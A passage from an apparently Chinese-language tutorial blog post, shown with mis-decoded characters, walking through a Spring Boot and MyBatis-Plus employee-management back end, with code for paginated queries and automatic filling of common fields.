/></p><p>æ‹¦æˆªäº†ï¼Œä½†æ˜¯é¡µé¢è·³è½¬ä¸äº†ã€‚æµè§ˆå™¨ç¼“å­˜åŸå› ã€‚<code>Ctrl+F5</code>å¼ºåˆ¶åˆ·æ–°</p><blockquote><p>è¿™é‡Œå¯èƒ½æœ‰ä¸ªç–‘é—®</p></blockquote><p><strong>urls</strong>ä¸­æœ‰<code>&quot;/backend/**&quot;,</code>ï¼Œå°±æ˜¯æŠŠ<mark>backend</mark>ç›®å½•ä¸‹å…¨éƒ¨èµ„æºè¿›è¡Œäº†æ”¾è¡Œï¼Œä¸ºä»€ä¹ˆè®¿é—® <strong><a href="http://localhost:8080/backend/index.html">http://localhost:8080/backend/index.html</a></strong>è¿˜æ˜¯ä¸è¡Œã€‚</p><p>åŸå› ï¼š</p><ul><li>â€‹<img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124214922289.png" alt="image-20221124214922289" /></li><li>è®¿é—®è¯¥é¡µé¢ï¼Œè‡ªåŠ¨å‘é€Ajaxè¯·æ±‚ã€‚è¯¥è¯·æ±‚ä¸å…è®¸æœªç™»å½•å°±è®¿é—®ã€‚æ—¢è¢«æ‹¦æˆª</li><li><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124215131587.png" alt="image-20221124215131587" /></li><li>å‰ç«¯æ‹¦æˆªå™¨è¿›è¡Œäº†é¡µé¢çš„è·³è½¬,ï¼ˆå› ä¸ºæ˜¯Ajaxè¯·æ±‚ï¼Œåç«¯ç›´æ¥è·³è½¬å¥½åƒæ˜¯ä¸è¡Œçš„ã€‚ï¼‰</li></ul><h2 id="æ–°å¢å‘˜å·¥"><a class="markdownIt-Anchor" href="#æ–°å¢å‘˜å·¥"></a> æ–°å¢å‘˜å·¥</h2><p>æ–°å¢å‘˜å·¥åŠŸèƒ½ï¼Œï¼ˆå‰ç«¯å¯¹æ‰‹æœºå·å’Œèº«ä»½è¯å·é•¿åº¦åšäº†ä¸€ä¸ªæ ¡éªŒï¼‰<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/966dd380180a47018ed362e125406271.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />è¯·æ±‚ URL: <a href="http://localhost:9001/employee">http://localhost:9001/employee</a> ï¼ˆPOSTè¯·æ±‚ï¼‰<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/8bae2348243f4d0ebe58ce97aff511d3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æ”¹é€ ä¸€ä¸‹Employeeå®ä½“ç±»ï¼Œé€šç”¨idé›ªèŠ±è‡ªå¢ç®—æ³•æ¥æ–°å¢id<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124215527273.png" alt="image-20221124215527273" /></p><h2 id="å…¨å±€å¼‚å¸¸å¤„ç†"><a class="markdownIt-Anchor" href="#å…¨å±€å¼‚å¸¸å¤„ç†"></a> å…¨å±€å¼‚å¸¸å¤„ç†</h2><p>å…ˆçœ‹çœ‹è¿™ç§ä»£ç çš„try catch<br />è¿™ç§try catchæ¥æ•è·å¼‚å¸¸å›ºç„¶å¥½ï¼Œ <strong>ä½†æ˜¯ ï¼Œä»£ç é‡ä¸€å¤§èµ·æ¥ï¼Œè¶…çº§å¤šçš„try catchå°±ä¼šå¾ˆä¹±</strong><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/232dfeaca28f420cb0fd5fae01f4ce15.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æ‰€ä»¥æˆ‘ä»¬è¦åŠ å…¥å…¨å±€å¼‚å¸¸å¤„ç†ï¼Œåœ¨CommonåŒ…ä¸‹ï¼Œå’ŒResultåŒçº§ï¼Œè¿™é‡Œåªæ˜¯ç¤ºä¾‹ï¼Œå¹¶ä¸å®Œæ•´<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/b8da6a3931714deeb724381c0ad2da41.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/33fe7337e5464cf9b07a7f0a31f67a04.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å½“æŠ¥é”™ä¿¡æ¯å‡ºç°Duplicate entryæ—¶ï¼Œå°±æ„å‘³ç€æ–°å¢å‘˜å·¥å¼‚å¸¸äº†<br />æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯¹å¼‚å¸¸ç±»çš„æ–¹æ³•è¿›è¡Œä¸€äº›å°æ”¹åŠ¨ï¼Œè®©è¿™ä¸ªå¼‚å¸¸åé¦ˆå˜å¾—æ›´äººæ€§åŒ–<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/b795bb06e106477192795c9fa56e15fa.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />è¿™ä¸ªæ—¶å€™å†æ¥å®¢æˆ·ç«¯è¯•è¯•ï¼Œå°±ä¼šæä¾›äººæ€§åŒ–çš„æŠ¥é”™ï¼Œéå¸¸çš„å¿«ä¹~<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/39454913ca2a48778c8c25281a03ff06.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><strong>è¿™å›å†å›åˆ°Controller ï¼Œè¿™æ—¶å°±ä¸éœ€è¦å†æ¥try catchè¿™ç§å½¢å¼äº†ï¼Œä¸ç”¨ç®¡ä»–ï¼Œå› ä¸ºä¸€æ—¦å‡ºç°é”™è¯¯å°±ä¼šè¢«æˆ‘ä»¬çš„AOPæ•è·ã€‚æ‰€ä»¥ï¼Œä¸éœ€è¦å†ç”¨try<br />catchæ¥æŠ“äº†</strong><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0e1e9a3feb7c4b7c8bfa1dc61286437f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="å‘˜å·¥ä¿¡æ¯åˆ†é¡µæŸ¥è¯¢"><a class="markdownIt-Anchor" href="#å‘˜å·¥ä¿¡æ¯åˆ†é¡µæŸ¥è¯¢"></a> å‘˜å·¥ä¿¡æ¯åˆ†é¡µæŸ¥è¯¢</h2><h3 id="æ¥å£åˆ†æ"><a class="markdownIt-Anchor" href="#æ¥å£åˆ†æ"></a> æ¥å£åˆ†æ</h3><p>è€ç”Ÿå¸¸è°ˆåˆ†é¡µæŸ¥è¯¢äº†<br />éœ€æ±‚<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/3899bbef468e4224b6b26fa6a13e103c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />åˆ†é¡µè¯·æ±‚æ¥å£<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/288dd9777c1944d195cb421038fbc885.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/3b9f9ddf4a304f44923ef89fa9b22ca7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æŸ¥è¯¢å‘˜å·¥åŠæ˜¾ç¤ºæ¥å£<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/cc0e4ee9f4b14b8d9e2c12428471889d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e339d98a293a43c19d3c6a6252da428b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />é€»è¾‘æµç¨‹<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/50fa6620581044c69049028b6921f72e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h3 id="åˆ†é¡µæ’ä»¶é…ç½®ç±»"><a class="markdownIt-Anchor" href="#åˆ†é¡µæ’ä»¶é…ç½®ç±»"></a> åˆ†é¡µæ’ä»¶é…ç½®ç±»</h3><p>åŠ å…¥é…ç½®ç±»<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/928faf96126040248a6c7629433b8f4a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h3 id="æ¥å£è®¾è®¡"><a class="markdownIt-Anchor" href="#æ¥å£è®¾è®¡"></a> æ¥å£è®¾è®¡</h3><p>å‰ç«¯æ³¨æ„äº‹é¡¹<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0e4186ba7e804ab6b1b3c6b2a3f1ce05.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/eae2123e010e4d048e3b5a1339cf41ce.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />pageå¯¹è±¡å†…éƒ¨<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/87eab00f37584a51bcee03f83d665e32.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />é‡Œé¢åŒ…å«äº†æŸ¥è¯¢æ„é€ å™¨çš„ä½¿ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * å‘˜å·¥ä¿¡æ¯åˆ†é¡µæŸ¥è¯¢</span><br><span class="hljs-comment">    *</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> page     int</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> pageSize int</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> name     java.lang.String</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@return</span> com.xyy.reggie.common.R&lt;com.baomidou.mybatisplus.extension.plugins.pagination.Page&gt;</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@author</span> å¸­å­</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-meta">@GetMapping(&quot;/page&quot;)</span><br>   <span class="hljs-keyword">public</span> R&lt;Page&gt; <span class="hljs-title function_">page</span><span class="hljs-params">(<span class="hljs-type">int</span> page, <span class="hljs-type">int</span> pageSize, String name)</span> &#123;<br>       log.info(<span class="hljs-string">&quot;page = &#123;&#125;,pageSize = &#123;&#125;,name = &#123;&#125;&quot;</span>, page, pageSize, name);<br><br>       <span class="hljs-comment">//æ„é€ åˆ†é¡µæ„é€ å™¨</span><br>       <span class="hljs-type">Page</span> <span class="hljs-variable">pageInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>(page, pageSize);<br><br>       <span class="hljs-comment">//æ„é€ æ¡ä»¶æ„é€ å™¨</span><br>       LambdaQueryWrapper&lt;Employee&gt; queryWrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>();<br>       <span class="hljs-comment">//æ·»åŠ è¿‡æ»¤æ¡ä»¶</span><br>       queryWrapper.like(StringUtils.isNotEmpty(name), Employee::getName, name);<br>       <span class="hljs-comment">//æ·»åŠ æ’åºæ¡ä»¶</span><br>       queryWrapper.orderByDesc(Employee::getUpdateTime);<br><br>       <span class="hljs-comment">//æ‰§è¡ŒæŸ¥è¯¢</span><br>       employeeService.page(pageInfo, queryWrapper);<br><br>       <span class="hljs-keyword">return</span> R.success(pageInfo);<br>   &#125;<br><br></code></pre></td></tr></table></figure><p>â€‹</p><h2 id="å¯ç”¨-ç¦ç”¨å‘˜å·¥è´¦å·"><a class="markdownIt-Anchor" href="#å¯ç”¨-ç¦ç”¨å‘˜å·¥è´¦å·"></a> å¯ç”¨ã€ç¦ç”¨å‘˜å·¥è´¦å·</h2><p>æ— éå°±æ˜¯ä¿®æ”¹statusï¼Œ0ç¦ç”¨ï¼Œ1å¯ç”¨<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/cbc14ff5649f4c3ab58a61f6a3717d55.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/00fd8c22798a4be0935fbe4706aac1a0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />è¿™ç§æ ¹æ®ç™»é™†äººç‰©æ¥è¿›è¡Œåˆ¤æ–­çš„ç©æ³•ï¼Œæ˜¯å‰ç«¯<br />è¿™ä¸ªé¡µé¢çš„ä½ç½®<code>resource/backend/page/member/list.html</code><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/15cb1554d5014d91a50a1d33faff5f0e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />çœ‹æ‹¿å‡ºæ¥çš„å¯¹è±¡æ˜¯ä»€ä¹ˆæ ·å­çš„ï¼Œå¦‚æœæ˜¯adminï¼Œvueçš„v-ifæŒ‡ä»¤å°±ä¼šæŠŠç¼–è¾‘æŒ‰é’®æ˜¾ç¤ºå‡ºæ¥<br />å¦‚æœæ˜¯æ™®é€šç”¨æˆ·ï¼Œå°±ä¼šæŠŠç¼–è¾‘æŒ‰é’®éšè—<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1a813cac7216496c9f007b2e89e94571.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h3 id="ä¿®å¤ä¸€ä¸ªå°bug"><a class="markdownIt-Anchor" href="#ä¿®å¤ä¸€ä¸ªå°bug"></a> ä¿®å¤ä¸€ä¸ªå°Bug</h3><p>å‰ç«¯ä¸€ç›´ä¸æ˜¾ç¤ºç¼–è¾‘æŒ‰é’®ï¼Œåœ¨localStorageé‡Œæ²¡æœ‰å‘ç°adminå¯¹è±¡<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/656ddea591c644369951b448d9437162.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />è¿™ä¸ªå€¼ä¸åº”è¯¥æ˜¯ç™»é™†æˆåŠŸï¼Œåº”è¯¥æ˜¯Employeeçš„å¯¹è±¡Json<br />çŒœæµ‹æ˜¯ç™»é™†çš„æ—¶å€™å¾€requesté‡Œå­˜å¯¹è±¡æ²¡å­˜å¥½<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e02134f0443f4cebaf01da0bebb88be3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æ”¹æˆå¯¹è±¡å­˜å…¥å°±å¥½äº†<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/3695c863613643ebb7c9d2fb6f44b1f2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />è¿™å›éƒ½æ­£å¸¸äº†<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f291200889854951bae0025d0c96d67f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h3 id="åŠŸèƒ½ç¼–å†™"><a class="markdownIt-Anchor" href="#åŠŸèƒ½ç¼–å†™"></a> åŠŸèƒ½ç¼–å†™</h3><p>å¤ä¹ ä¸€ä¸‹<br /><strong>PutMappingæ˜¯Resultfulé£æ ¼çš„è¯·æ±‚æ–¹å¼</strong><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0dcd79a42b334bae8337cb40a73fd17c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å½“å‰çŠ¶æ€æ˜¯1ï¼Œç›´æ¥å¸¦ç€ç›®æ ‡çŠ¶æ€å€¼ï¼ˆçŠ¶æ€æ”¹ç¦ç”¨ï¼‰è¿›è¡Œæ›´æ–°<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/bbc8b8c97744496491c18389cf13f2f1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />Idç²¾åº¦ä¸¢å¤±ï¼Œjsç‹¬æœ‰çš„bugï¼Œç›´æ¥å¤„ç†Longå¤„ç†ä¸äº†ï¼Œè¦Longè½¬Stringå†è¿”å›å»</p><blockquote><p>è¿™ä¸ªè¦æ³¨æ„ï¼Œæˆ‘ä»¥å‰å†™é¡¹ç›®çš„æ—¶å€™å°±é‡åˆ°è¿™ä¸ªbugã€‚å·¨å‘</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/bd851e41062148db9a7d4b84b687372f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/65954dc589544fe1bc98a70d0a878936.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />åˆ©ç”¨å¯¹è±¡è½¬æ¢å™¨JacksonObjectMapperï¼Œå°†å¯¹è±¡è½¬Json  å°†Longå‹çš„Idè½¬æ¢ä¸ºStringç±»å‹çš„æ•°æ®<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7b18d09c0e75446db59dab3f6f4f505a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p>åœ¨MVCé…ç½®ç±»ä¸­æ‰©å±•ä¸€ä¸ªæ¶ˆæ¯è½¬æ¢å™¨<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/bc895faafbb247eb9e580f553d32d4e6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æµ‹è¯•åŠŸèƒ½æ­£å¸¸ï¼Œæ­£å¸¸æ›´æ–°å‘˜å·¥çŠ¶æ€<br />æ¶ˆæ¯æ‰©å±•å™¨é…ç½®ä½ç½®ï¼š<code>com.xyy.common.JacksonObjectMapper</code><br />å¯¹è±¡æ˜ å°„å™¨ä½ç½®ï¼š<code>com.xyy.config.WebMvcConfig</code><br />å‘˜å·¥çŠ¶æ€æ›´æ–°ä½ç½®ï¼š<code>com.xyy.controller.EmployeeController</code></p><h2 id="ç¼–è¾‘å‘˜å·¥ä¿¡æ¯"><a class="markdownIt-Anchor" href="#ç¼–è¾‘å‘˜å·¥ä¿¡æ¯"></a> ç¼–è¾‘å‘˜å·¥ä¿¡æ¯</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/83b635aff2ca4445840f24ef5c60a22b.png" alt=" " /><br />è¯·æ±‚APIï¼Œè¿™ä¸ªæ˜¯å…ˆå‘è¯·æ±‚ï¼ŒæŸ¥åˆ°ç”¨æˆ·ï¼Œç„¶åå¡«å……åˆ°é¡µé¢ä¸Š<br />å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ç§è¯·æ±‚æ–¹å¼æ˜¯ResultFulé£æ ¼çš„è¯·æ±‚æ–¹å¼<br />åœ¨æ§åˆ¶å™¨ä¸­è¦ç”¨@PathVariable(â€œ/{å‚æ•°åç§°}â€)æ³¨è§£æ¥è¿›è¡Œæ¥æ”¶<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7f1a236c859d418eb4aa1177cbf82543.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f7b34494b2eb42b8b315e9f7c2802956.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å®Œç¾æ›´æ–°</p><h2 id="å…¬å…±å­—æ®µè‡ªåŠ¨å¡«å……"><a class="markdownIt-Anchor" href="#å…¬å…±å­—æ®µè‡ªåŠ¨å¡«å……"></a> å…¬å…±å­—æ®µè‡ªåŠ¨å¡«å……</h2><p>åƒæ˜¯ä¸€éƒ¨åˆ†å…¬å…±å­—æ®µï¼Œåå¤å¡«å……èµ·æ¥æ²¡æœ‰æ„ä¹‰ï¼Œç®€åŒ–å¡«å……çš„æ“ä½œã€‚<br />æŠŠè¿™ä¸ªåŠŸèƒ½æ‹¿å‡ºæ¥ï¼Œå•ç‹¬æ‹å‡ºæ¥åšè‡ªåŠ¨å¡«å……å¤„ç†<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f6b5a68d4b8646aab2b39db34fba625a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/09eaaee0510849749512ef973529a4ed.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä¸ºå®ä½“ç±»å±æ€§ä¸Šé¢åŠ å…¥æ³¨è§£<code>@TableField(fill = å¡«å……æ¡ä»¶)</code><br />çœ‹ä¸€ä¸‹æºç ã€‚fillæ˜¯å¡«å……æ¡ä»¶ï¼Œç”¨æšä¸¾æ¥è¿›è¡Œå¤„ç†çš„<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/c41f5a745d6c48d5b944fbe2b81e5726.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />åŠ å®Œæ³¨è§£å’Œæ¡ä»¶ä¸ç®—å®Œï¼Œè¿˜è¦åŠ å…¥é…ç½®ç±»è¿›è¡Œå¤„ç†ï¼Œå¯¹å¡«å……çš„æ•°æ®åšè§„å®š<br />åœ¨commonåŒ…ä¸‹åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰ç±»ï¼Œæœ€å…³é”®çš„æ˜¯è¦å®ç°<code>MetaObjectHandleræ¥å£ä¸‹çš„insertFillå’ŒupdateFill</code><br />ç¡®è®¤å¡«å……æ—¶éœ€è¦çš„å­—æ®µã€‚è¿˜æœ‰è¦åŠ å…¥@Componentæ³¨è§£ï¼Œå°†è¿™ä¸ªç±»äº¤ç»™æ¡†æ¶æ¥ç®¡ç†ï¼Œå¦åˆ™çš„è¯å®¹æ˜“æ‰¾ä¸åˆ°,setValueçš„å€¼ä¼šæ ¹æ®æ³¨è§£åŠ å…¥çš„å­—æ®µåç§°æ¥é”å®šæ˜¯å¦éœ€è¦æ›´æ–°<br />ä½ç½®ï¼š<code>com.xyy.common.MyMetaObjectHandler</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMetaObjecthandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MetaObjectHandler</span> &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ’å…¥æ“ä½œï¼Œè‡ªåŠ¨å¡«å……</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> metaObject</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertFill</span><span class="hljs-params">(MetaObject metaObject)</span> &#123;<br>        log.info(<span class="hljs-string">&quot;å…¬å…±å­—æ®µè‡ªåŠ¨å¡«å……[insert]...&quot;</span>);<br>        log.info(metaObject.toString());<br><br>        metaObject.setValue(<span class="hljs-string">&quot;createTime&quot;</span>, LocalDateTime.now());<br>        metaObject.setValue(<span class="hljs-string">&quot;updateTime&quot;</span>,LocalDateTime.now());<br><span class="hljs-comment">//        metaObject.setValue(&quot;createUser&quot;, BaseContext.getCurrentId());</span><br><span class="hljs-comment">//        metaObject.setValue(&quot;updateUser&quot;,BaseContext.getCurrentId());</span><br>        metaObject.setValue(<span class="hljs-string">&quot;createUser&quot;</span>,<span class="hljs-number">1L</span>);<br>        metaObject.setValue(<span class="hljs-string">&quot;updateUser&quot;</span>,<span class="hljs-number">1L</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ›´æ–°æ“ä½œï¼Œè‡ªåŠ¨å¡«å……</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> metaObject</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateFill</span><span class="hljs-params">(MetaObject metaObject)</span> &#123;<br>        log.info(<span class="hljs-string">&quot;å…¬å…±å­—æ®µè‡ªåŠ¨å¡«å……[update]...&quot;</span>);<br>        log.info(metaObject.toString());<br><br>        <span class="hljs-type">long</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> Thread.currentThread().getId();<br>        log.info(<span class="hljs-string">&quot;çº¿ç¨‹idä¸ºï¼š&#123;&#125;&quot;</span>,id);<br><br>        metaObject.setValue(<span class="hljs-string">&quot;updateTime&quot;</span>,LocalDateTime.now());<br><span class="hljs-comment">//        metaObject.setValue(&quot;updateUser&quot;,BaseContext.getCurrentId());</span><br>        metaObject.setValue(<span class="hljs-string">&quot;updateUser&quot;</span>,<span class="hljs-number">1L</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œå¦‚æœæˆ‘æƒ³å»æ›´æ–°ç®¡ç†å‘˜å­—æ®µæ˜¯éå¸¸å›°éš¾çš„ï¼Œå› ä¸ºæˆ‘è¿™é‡Œæ‹¿ä¸åˆ°Requestçš„ä½œç”¨åŸŸå¯¹è±¡ï¼Œæ‰€ä»¥è¦æƒ³ä¸ªåŠæ³•æ¥å¤„ç†ã€‚<br />è¿™ä¸ªæ—¶å€™å°±éœ€è¦<code>ThreadLocal</code>æ¥è¿›è¡Œå¯¹è±¡çš„è·å–ï¼Œè¿™ä¸ªçº¿ç¨‹æ˜¯è´¯ç©¿æ•´ä¸ªè¿è¡Œçš„ï¼Œå¯ä»¥é€šè¿‡ä»–æ¥è·å–</p><h3 id="ä½¿ç”¨æ—¶"><a class="markdownIt-Anchor" href="#ä½¿ç”¨æ—¶"></a> ä½¿ç”¨æ—¶</h3><p>ä½•ä¸ºThreadLocal<br /><strong>é‡ç‚¹æ¥äº†</strong><br />è¿™ä¸ªå›¾<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/a747301972964b88a7db5dc9d84995e6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/62ec83c598a546b89722fef26f3ca4b4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æˆ‘çš„æ€è·¯å°±æ˜¯åœ¨ç”¨æˆ·ç™»é™†çš„æ—¶å€™ï¼ŒæŠŠè¿™ä¸ªidå­˜è¿›å»ï¼Œç­‰åˆ°åœ¨å¡«å……å­—æ®µçš„æ—¶å€™ï¼Œä»ThreadLocalé‡ŒæŠŠè¿™ä¸ªèµ„æºå†æ‹¿å‡ºæ¥ã€‚<br />ç›´æ¥æ“ä½œä¸å¤ªå¥½ï¼ŒæŠŠä»–å°è£…æˆä¸€ä¸ªå·¥å…·ç±»ï¼Œè¿™ä¸ªå·¥å…·ç±»é‡Œæ–¹æ³•éƒ½æ˜¯é™æ€çš„ï¼Œå¯ä»¥é€šè¿‡ç±»ç›´æ¥è°ƒç”¨ã€å¹¶ä¸”éƒ½æ˜¯é™æ€æ–¹æ³•ï¼Œæ¥æ“ä½œä¿å­˜å’Œè¯»å–<br 